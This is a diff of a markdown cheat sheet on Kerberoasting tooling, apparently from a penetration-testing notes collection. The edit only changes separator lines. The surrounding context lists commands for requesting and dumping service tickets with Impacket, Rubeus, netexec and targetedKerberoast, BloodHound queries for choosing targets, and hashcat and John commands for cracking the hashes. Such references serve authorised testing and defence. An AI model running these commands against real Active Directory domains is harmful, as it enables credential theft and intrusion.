@@ -20,7 +20,7 @@ linked:
 ---
 # Kerberoasting - Tooling
 
-***
+---
 
 ## Impacket-GetUserSPNs (Linux)
 
@@ -36,7 +36,7 @@ linked:
 | `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -usersfile users.txt` | Multiple from file | Targeted bulk. |
 ^kerb-tool-impacket
 
-___
+---
 
 ## Rubeus (Windows)
 
@@ -54,7 +54,7 @@ ___
 | `Rubeus.exe kerberoast /format:john /outfile:h.txt` | John format | Alt cracker. |
 ^kerb-tool-rubeus
 
-___
+---
 
 ## netexec / crackmapexec
 
@@ -66,7 +66,7 @@ ___
 | `nxc ldap <DC> -u 'corp\u' -p pass --kerberoasting cross.hash --kdcHost <foreign-DC>` | Cross-domain | Cross-trust. |
 ^kerb-tool-nxc
 
-___
+---
 
 ## targetedKerberoast.py
 
@@ -82,7 +82,7 @@ git clone https://github.com/ShutdownRepo/targetedKerberoast
 python3 targetedKerberoast/targetedKerberoast.py -d corp.local -u atacante -p 'Pass!' --dc-ip <DC>
 ```
 
-___
+---
 
 ## hashcat
 
@@ -98,7 +98,7 @@ ___
 | `hashcat -m 13100 h.txt --show` | Show cracked | Post-run. |
 ^kerb-tool-hashcat
 
-___
+---
 
 ## John the Ripper
 
@@ -110,7 +110,7 @@ ___
 | `john --format=krb5tgs --show h.txt` | Show cracked | Post-run. |
 ^kerb-tool-john
 
-___
+---
 
 ## bloodyAD (Linux)
 
@@ -121,7 +121,7 @@ ___
 | `bloodyAD --host <DC> -d corp -u u -p pass get search "(servicePrincipalName=*)" --attr samAccountName,servicePrincipalName` | Enum SPNs Linux | Recon. |
 ^kerb-tool-bloodyad
 
-___
+---
 
 ## BloodHound Custom Queries
 
@@ -132,7 +132,7 @@ ___
 | `MATCH (u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(t:User) WHERE NOT t.hasspn RETURN p` | Targeted candidates | Targeted ACL hunt. |
 ^kerb-tool-bh
 
-___
+---
 
 ## Recursos
 
@@ -149,4 +149,4 @@ ___
 | MITRE ATT&CK T1558.003 | `https://attack.mitre.org/techniques/T1558/003/` |
 ^kerb-tool-resources
 
-***
+---
